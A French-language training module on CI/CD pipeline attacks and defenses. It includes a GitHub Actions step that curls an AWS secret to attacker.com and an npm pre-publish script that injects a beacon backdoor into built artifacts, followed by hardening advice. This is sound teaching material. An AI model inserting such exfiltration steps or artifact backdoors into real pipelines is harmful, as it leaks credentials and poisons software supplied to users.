# Module A17 : Build Compromise - Attaques CI/CD

## Objectifs pédagogiques

- Comprendre les attaques sur les pipelines CI/CD
- Exploiter GitHub Actions, GitLab CI, Jenkins
- Injecter du code malveillant dans les builds
- Sécuriser les pipelines CI/CD

## Introduction

Les **build systems** (CI/CD) sont des cibles privilégiées car ils :
- Ont accès aux secrets (tokens, clés API)
- Génèrent les artefacts distribués (binaires, packages)
- Sont souvent sous-sécurisés

```
┌────────────────────────────────────────────┐
│         CI/CD Attack Surface               │
└────────────────────────────────────────────┘

Developer PC
  ├─> Push code
  │
GitHub/GitLab
  ├─> Trigger CI/CD (GitHub Actions, GitLab CI)
  │   ├─> Access secrets (AWS_KEY, NPM_TOKEN)
  │   ├─> Build artifact
  │   └─> Publish to registry
  │
Compromission possible à chaque étape !
```

## Attaque : Exfiltration secrets

**GitHub Actions (.github/workflows/build.yml) :**
```yaml
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        env:
          AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
        run: |
          curl https://attacker.com/?key=$AWS_ACCESS_KEY
          # Build normal...
```

**Impact :** Les secrets sont exfiltrés à chaque build.

## Attaque : Poison build artifact

**Scénario SolarWinds-like :**

1. Compromission du build server
2. Injection code malveillant dans l'artifact
3. Artifact signé et distribué aux clients
4. Supply chain attack massive

**Code injection (npm) :**
```javascript
// Dans un script pre-publish
const fs = require('fs');

// Injecter backdoor dans l'artifact final
fs.appendFileSync('dist/index.js', `
  require('https').get('https://attacker.com/beacon');
`);
```

## Défense

**Best practices :**
```yaml
# Utiliser des secrets OIDC au lieu de tokens statiques
permissions:
  id-token: write
  contents: read

# Limiter les permissions
permissions:
  contents: read  # Pas write !

# Pin les actions à un SHA (pas @v2)
- uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675
```

**Audit :**
```bash
# Vérifier les workflows GitHub Actions
find .github/workflows -name "*.yml" -exec grep -H "secrets\." {} \;
```

## Résumé

- CI/CD = cible privilégiée (accès secrets + artifacts)
- Attaques : exfiltration secrets, poisoning artifacts
- Exemple réel : SolarWinds (build compromised)
- Défense : permissions minimales, OIDC, audit workflows

## Ressources

- **GitHub Actions Security** : https://docs.github.com/en/actions/security-guides
- **SolarWinds Analysis** : https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/

---

**Module suivant** : [Signed Malware](../04-Signed-Malware/)
